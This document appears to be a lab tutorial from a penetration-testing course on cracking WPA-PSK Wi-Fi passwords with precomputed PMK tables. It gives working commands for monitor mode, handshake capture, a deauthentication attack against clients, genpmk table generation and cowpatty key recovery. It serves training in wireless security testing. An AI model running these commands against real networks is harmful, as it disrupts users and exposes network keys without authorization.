# Chain #16: Precomputation (Rainbow Table) Attack

## Goal & Scope

Use precomputed PMKs (genpmk) to accelerate WPA‑PSK cracking against a known SSID by:

- Generating SSID‑specific PMK tables.
- Matching captured 4‑way handshakes against precomputed tables with cowpatty.
- Understanding trade‑offs: speed vs storage/target specificity.

---

## Concept (Short)

WPA‑PSK derives a PMK from the passphrase and SSID with PBKDF2. genpmk precomputes PMKs for many candidate passphrases _for a specific SSID_, producing a lookup file. cowpatty can match a captured 4‑way handshake to that precomputed table much faster than re‑deriving PBKDF2 for every candidate.

**When to use:**

- Target SSID is known and fixed (e.g., corporate SSID used by many APs).
- You will repeatedly test the same SSID (amortize generation cost).

**When not ideal:**

- You need to attack many different SSIDs (table per SSID → expensive).
- Storage or time to precompute is limited.

---

## Step 1 — Put Interface in Monitor Mode

Prepare wireless card for capture:

```bash
sudo airmon-ng start wlan0
```

- `airmon-ng` enables monitor mode (creates wlan0mon).
- If processes interfere, run `airmon-ng check kill`.

---

## Step 2 — Capture Handshake with airodump-ng

Scan and save capture (replace channel and ESSID accordingly):

```bash
airodump-ng wlan0mon -c 1 -w WPA --essid HackTheBox
```

- `-c 1`: lock to channel 1.
- `-w WPA`: write captures with prefix `WPA`.
- Watch `WPA-01.cap` for the `WPA handshake:` marker.

Force a reauthentication (optional) to trigger handshake:

```bash
aireplay-ng -0 5 -a <BSSID> -c <STATION> wlan0mon
```

- `-0 5`: send 5 deauths.
- `-a`: AP MAC (BSSID).
- `-c`: client MAC to direct deauth.

---

## Step 3 — Precompute PMKs with genpmk

Create the SSID‑specific PMK table from a wordlist:

```bash
genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox
```

Flags explained:

- `-f /opt/rockyou.txt`: source wordlist of candidate passphrases.
- `-d /tmp/hashtable`: destination file to store precomputed PMKs.
- `-s HackTheBox`: SSID to tie the PMK generation to.

Notes:

- Generation is CPU/GPU intensive and can be long for large lists.
- Limit generation (e.g., 30k keys) to avoid huge storage in lab environments.

---

## Step 4 — Crack Using cowpatty Against Precomputed Table

Once you have a capture (`WPA-01.cap`) and `hashtable`, run cowpatty:

```bash
cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox
```

Flags explained:

- `-d /tmp/hashtable`: use precomputed PMK file.
- `-r WPA-01.cap`: the capture file with 4‑way handshake.
- `-s HackTheBox`: the SSID (must match table).

If matched, cowpatty outputs the recovered PSK quickly because it avoids costly PBKDF2 recalculation.

---

## Step 5 — Example Full Flow (Quick)

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
airodump-ng wlan0mon -c 1 -w WPA --essid HackTheBox
# optionally: aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon
# generate table (on powerful/parallel host)
genpmk -f /opt/rockyou.txt -d /tmp/hashtable -s HackTheBox
# match handshake
cowpatty -d /tmp/hashtable -r WPA-01.cap -s HackTheBox
```

---

## Trade‑offs & Practical Notes

- **SSID specificity:** Each table only works for the SSID used during generation. If AP uses different SSID, regenerate.
- **Storage:** Large wordlists → very large hash tables. Plan disk space.
- **Time:** Generating tables is time‑consuming; only worth it when amortized over many handshakes for same SSID.
- **Alternatives:** Hashcat with hcxpcapngtool → use GPU for fast cracking without precomputing, more flexible across SSIDs.

---

## Checklist

-  Put interface into monitor mode.
-  Capture handshake (airodump-ng; deauth if needed).
-  Run genpmk with chosen wordlist and SSID.
-  Use cowpatty to test capture against generated table.
-  If unsuccessful, expand wordlist or use Hashcat methods.